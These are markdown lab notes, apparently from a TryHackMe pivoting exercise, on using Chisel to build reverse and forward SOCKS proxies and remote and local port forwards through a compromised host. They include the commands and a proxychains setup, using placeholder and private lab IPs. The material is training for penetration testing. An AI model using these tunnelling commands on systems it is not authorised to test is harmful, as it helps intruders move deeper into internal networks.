# Chisel

* Is used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system.
* https://github.com/jpillora/chisel/releases
* The chisel binary has two modes: client and server. You can access the help menus for either with the command: `chisel client|server --help`
* ![alt text](https://assets.tryhackme.com/additional/wreath-network/9435cdc6e54d.png)

### Chisel Reverse SOCKS Proxy:

* This connects back from a compromised server to a listener waiting on our attacking machine.
* On our own attacking box we would use a command that looks something like this:

```
./chisel server -p LISTEN_PORT --reverse &
```

* ![alt text](https://assets.tryhackme.com/additional/wreath-network/a27fb82676b4.png)
* Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080.
* As such, we will be using port 1080 when sending data through the proxy.

### Forward SOCKS Proxy:

* In many ways the syntax for this is simply reversed from a reverse proxy.
* First, on the compromised host we would use:

```
./chisel server -p LISTEN_PORT --socks5
```

* On our own attacking box we would then use:

```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

* In this command, PROXY\_PORT is the port that will be opened for the proxy.
* For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port `8080` of `172.16.0.10`.
* A SOCKS proxy would be opened on port `1337` of our attacking machine.

#### Proxychains Reminder:

* When sending data through either of these proxies, we would need to set the port in our proxychains configuration.
* As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

### Chisel Remote Port Forward:

* A remote port forward is when we connect back from a compromised target to create the forward.
* For a remote port forward, on our attacking machine we use the exact same command as before:

```
./chisel server -p LISTEN_PORT --reverse &
```

* Once again this sets up a chisel listener for the compromised host to connect back to.
* The command to connect back is slightly different this time, however:

```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

* Let's assume that our own IP is `172.16.0.20`, the compromised server's IP is `172.16.0.5`, and our target is port `22` on `172.16.0.10`. The syntax for forwarding `172.16.0.10:22` back to port `2222` on our attacking machine would be as follows:

```
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

* Connecting back to our attacking machine, functioning as a chisel server started with:

```
./chisel server -p 1337 --reverse &
```

* This would allow us to access `172.16.0.10:22` (via SSH) by navigating to `127.0.0.1:2222`.

### Chisel Local Port Forward:

* As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
* On the compromised target we set up a chisel server:

```
./chisel server -p LISTEN_PORT
```

* We now connect to this from our attacking machine like so:

```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

* For example, to connect to `172.16.0.5:8000` (the compromised host running a chisel server), forwarding our local port `2222` to `172.16.0.10:22` (our intended target), we could use:

```
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```
